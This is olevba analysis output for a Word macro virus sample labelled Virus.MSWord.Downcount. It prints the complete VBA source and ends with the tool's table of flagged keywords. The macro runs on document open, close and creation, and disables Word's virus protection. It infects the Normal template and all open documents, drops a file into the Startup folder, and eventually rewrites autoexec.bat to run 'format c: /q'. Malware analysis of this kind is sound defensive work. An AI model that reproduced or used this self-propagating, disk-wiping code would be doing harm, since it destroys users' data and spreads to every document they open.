olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Downcount
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Downcount - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Hers_001'
'CMOS_Killer'
'Deviator'
On Error Resume Next
With Application.Options
 .ConfirmConversions = False
 .VirusProtection = False
 .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
'This is small fun'
Const id2 = "'Hers_001'"
Const reg = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
Dim flag
flag = System.PrivateProfileString("", reg, "CMOS")
If flag = "0" Then GoTo Quit
Dim SourseText, Path, Startup, Count
    Count = System.PrivateProfileString("", reg, "COUNTDOWN")
    If Count = "" Then System.PrivateProfileString("", reg, "COUNTDOWN") = 1
    Count = Count + 1
    System.PrivateProfileString("", reg, "COUNTDOWN") = Count
    Select Case Count
    Case 10 To 99
        With Application.FileSearch
            .NewSearch
            .LookIn = "c:\windows\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà"
            .FileName = "rundll.com"
            .SearchSubFolders = False
            If .Execute > 0 Then GoTo r1
        End With
        Open "c:\windows\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà\rundll.com" For Output As #1
        SourseText = "²p2ö°.îB2ÀîÍ "
        Print #1, SourseText
        Close #1
'    Case 100 To 299
'        Kill "c:\io.sys"
'        Kill "c:\msdos.sys"
    Case 100
        Kill "c:\autoexec.bat"
        Open "c:\autoexec.bat" For Output As #1
        SourseText = "format c: /q"
        Print #1, SourseText
        Close #1
   End Select
r1:
Dim normal As Object, Document As Object
Set normal = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set Document = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If normal.Lines(2, 1) <> id2 Then normal.DeleteLines 1, normal.CountOfLines
If normal.CountOfLines = 0 Then normal.InsertLines 1, Document.Lines(1, Document.CountOfLines)
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
    With Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule
     If .Lines(2, 1) <> id2 Then .DeleteLines 1, .CountOfLines
     If .CountOfLines = 0 Then .InsertLines 1, normal.Lines(1, normal.CountOfLines)
    End With
Next k


Quit:
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

